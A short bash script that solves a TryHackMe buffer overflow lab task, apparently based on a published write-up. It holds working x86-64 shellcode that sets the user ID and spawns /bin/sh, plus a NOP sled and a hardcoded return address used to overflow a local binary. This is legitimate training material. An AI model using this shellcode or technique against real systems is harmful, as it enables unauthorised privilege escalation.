#!/usr/bin/env bash

# simple script to solve task eight (overflow 2) of the buffer overflow room on tryhack me: https://tryhackme.com/room/bof1

# based on the write-up here: https://l1ge.github.io/tryhackme_bof1/
# this room is not as easy as it makes itself out to be :D

# note this shell code is 62 bytes long, sets an exit code and sets the UUID to user2, required for the secret file
# without the exit code (like the shellcode provided in the room) the program will just continue and crash.
shellcode='\x48\x31\xFF\x48\x31\xC0\x48\x31\xF6\x66\xBE\xEA\x03\x66\xBF\xEA\x03\xB0\x71\x0F\x05\x48\x31\xD2\x48\xBB\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\x48\x31\xC0\x50\x57\x48\x89\xE6\xB0\x3B\x0F\x05\x6A\x01\x5F\x6A\x3C\x58\x0F\x05'

# a target position in the stack, roughly where the buffer is. Always in a valid place thanks to no ASLR on the machine
# not that is different in gdb vs command line, due to stack positioning. in gdb, use \x60 instead of \x90
target='\x98\xe2\xff\xff\xff\x7f'

# util function in bash to repeat characters (equiv to 'A'*60 in python for example)
function repeat { printf "%.s$1" $(seq 1 $2); }

# final code
injected=$(repeat "\x90" 60)$(printf $shellcode)$(repeat A 30)$(printf $target)

./buffer-overflow $injected